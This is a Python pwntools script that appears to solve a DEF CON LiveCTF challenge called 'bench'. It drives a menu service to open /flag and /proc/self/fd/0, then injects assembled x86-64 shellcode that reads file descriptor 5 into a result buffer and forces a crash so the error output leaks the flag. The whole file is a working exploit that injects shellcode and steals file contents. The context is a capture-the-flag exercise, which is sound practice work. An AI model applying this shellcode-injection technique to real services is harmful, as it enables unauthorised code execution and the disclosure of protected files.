#!/usr/bin/env python3

from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

context.update(arch='amd64', os='linux')

# ex = "/home/bzhugs/Documents/Pentest/ctf/defcon/bench/handout/challenge"
# gdbscript = """set follow-fork-mode child
# start
# pie break *0x197F
# c
# """
# io = gdb.debug(ex, gdbscript=gdbscript, exe=ex)

io = remote(HOST, int(PORT))

# io = process(ex)

for i in range(100):
    io.sendlineafter(b"Choice: ", b"1")
    io.sendlineafter(b"> ", b"/flag")

    io.sendlineafter(b"Choice: ", b"1")
    io.sendlineafter(b"> ", b"/flag")

    io.sendlineafter(b"Choice: ", b"1")
    io.sendlineafter(b"> ", b"/proc/self/fd/0")


    payload = """
        mov rdx, [rbp-0x28] /* result struct */
        lea rbp, [rdx+0xc] /* result->file buf */

        mov rax, 0   /* SYS_read */
        mov rdi, 5   # fd
        mov rdx, 64  # size
        mov rsi, rbp # buf
        syscall
        int3 /* force crash to print error in result*/
    """

    SC = asm(payload)

    # with open("sc", "wb") as f:
    #     f.write(SC)

    io.sendline(SC + b"\x00"*(0x100-len(SC)))
    io.sendlineafter(b"Choice: ", b"2")
    flag = io.recvline_contains(b'LiveCTF{').decode().strip()
    log.info('Flag: %s', flag)
    # buf = io.recvuntil(b"1. Run file").split(b"Failed to complete\n")
